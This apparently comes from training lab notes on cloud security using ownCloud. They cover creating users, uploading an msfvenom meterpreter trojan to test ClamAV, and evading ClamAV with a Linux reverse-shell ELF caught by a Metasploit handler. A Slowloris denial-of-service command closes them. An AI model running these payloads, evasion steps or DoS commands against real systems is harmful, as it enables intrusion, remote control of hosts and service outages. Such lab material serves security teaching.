# Module 19 - Cloud Computing #

## Creating User Accounts and Assigning User Rights ##

### ownCloud ###
1. Login as Admin into ``` http://localhost/owncloud ``` (There's also a client desktop app).
2. Right Menu > 'Users'
3. Enter the username and password into the 'Username' and 'Password' fields, select the Groups it will belong to and click on 'Create'
4. Left Menu > 'Files'
5. Add Icon > Select a folder to add > 'Share'
6. Double Click the newly added folder > Add > Upload a file
7. Go back to the Files section

## Securing ownCloud from Malicious File Uploads ##

Create the Trojan (``` msfvenom -p windows/meterpreter/reverse_tcp -f exe > <Output Path>/trojan.exe ```) and upload it to ``` http://<Victim IP>/owncloud ```.

### ClamAV ###
It will detect the Trojan and stop the upload.

## Bypassing ownCloud Antivirus and Hacking the Host ##
1. Create a malicious file (``` msfvenom -p linux/x86/shell/reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> --platform linux -f elf > <Output Path>/exploit.elf ```) and upload it to ``` http://<Victim IP>/owncloud ```.
2. ClamAV will not detect it because we've changed the payload architecture.
3. ``` msfconsole ``` > ``` use multi/handler ``` > ``` set payload linux/x86/shell/reverse_tcp ```, ``` set LHOST <Attacker IP> ```, ``` set LPORT <Attacker Port> ```, ``` exploit ```
4. Now, from the victim machine download the ``` exploit.elf ``` file, change its permissions (``` chmod -R 755 exploit.elf ```) and execute it (``` ./exploit.elf ```).
5. In the attacker machine, if Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.

## Implementing DoS Attack on Linux Cloud Server ##

### Slowloris ScriptÂ ###
1. Go to the Slowloris folder (``` cd Desktop/Slowloris/ ```)
2. Change the permissions to the main file ``` chmod 777 Slowloris.pl ```
3. Perform the DoS attack: ``` ./Slowloris.pl -dns <Target IP> ```
